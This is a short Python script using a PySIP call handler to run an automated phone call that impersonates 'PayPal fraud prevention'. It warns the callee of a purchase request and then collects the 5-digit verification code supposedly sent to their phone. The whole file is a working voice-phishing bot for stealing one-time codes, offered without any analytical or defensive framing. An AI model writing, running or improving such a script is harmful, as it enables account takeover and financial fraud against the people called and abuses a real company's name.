from PySIP.call_handler import CallHandler


async def call_flow(call_handler: CallHandler):
    DELAY_ERR_MESSAGE = "We did no receive any input. Please enter the 5 digit confirmation code we have sent to your number"
    
    await call_handler.sleep(4)
    await call_handler.say("Weclome to PayPal fraud prevention line")
    await call_handler.say("we have recently received an online purchase request from your PayPal account. If this was not you press 1")
    dtmf_result = await call_handler.gather_and_say()

    if not dtmf_result:
        await call_handler.hangup()
        return
    
    await call_handler.say("We nee to confirm you identity before blocking this request. Please enter the 5 digit code we sent to your number followed by the pound key")
    await call_handler.gather_and_say(length=5, delay=8, finish_on_key="#", delay_msg=DELAY_ERR_MESSAGE)

    